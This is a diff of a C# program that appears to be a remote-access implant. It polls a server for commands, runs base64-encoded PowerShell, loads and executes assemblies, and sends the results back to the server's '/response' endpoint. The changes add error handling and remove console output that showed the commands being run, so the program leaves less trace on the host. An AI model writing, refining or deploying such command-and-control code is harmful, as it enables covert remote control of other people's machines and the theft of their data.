@@ -1,4 +1,5 @@
-﻿using System.Diagnostics;
+﻿#pragma warning disable 4014 //I don't need to wait for response
+using System.Diagnostics;
 using System.Reflection;
 
 string responseBody;
@@ -26,6 +27,10 @@ void assemblyrun(string name) {
         }
         Assembly asm = loadedasms[name];
         var method = asm.EntryPoint;
+        if (method == null) {
+            sendmessagetoserver("Was unable to find entrypoint");
+            return;
+        }
         method.Invoke(null, new object[] {new string[] { } });
     } catch (Exception e) {
         sendmessagetoserver(e.ToString());
@@ -44,9 +49,8 @@ void runpowershellscript(string[] arguments) {
     byte[] bytearray = Convert.FromBase64String(script);
     var command = System.Text.Encoding.UTF8.GetString(bytearray, 0, bytearray.Length);
     using (System.Management.Automation.PowerShell ps = System.Management.Automation.PowerShell.Create()) {
-        Console.WriteLine(command + therestofarguments);
         ps.AddScript(command + therestofarguments);
-        ps.AddCommand("Out-String");
+        ps.AddCommand("Out-String"); //so we get a nice string rather than a bunch of objects
         var results = ps.Invoke();
         
         string returnvalue = "";
@@ -87,11 +91,16 @@ bool handlecommands(string command) {
 HttpClient client = new HttpClient();
 
 async Task<bool> sendmessagetoserver(string message) {
-    StringContent postdata = new StringContent(message);
-    var response = await client.PostAsync(server + "/response", postdata);
-    responseBody = await response.Content.ReadAsStringAsync();
-    Console.WriteLine(responseBody); //print the response for sanity checking
-    return true;
+    try {
+        StringContent postdata = new StringContent(message);
+        var response = await client.PostAsync(server + "/response", postdata);
+        //var responseBody = await response.Content.ReadAsStringAsync();
+        //Console.WriteLine(responseBody); //print the response for sanity checking
+        return true;
+    } catch (Exception e) {
+        Console.WriteLine("Hope it wasn't an important message \n" + e.ToString());
+        return false;
+    }
 }
 
 while (true) {
@@ -103,7 +112,6 @@ try {
     }
     //response.EnsureSuccessStatusCode();
     responseBody = await response.Content.ReadAsStringAsync();
-    Console.WriteLine(responseBody); //print the request for sanity checking
     if (handlecommands(responseBody)) {
         continue;
     }
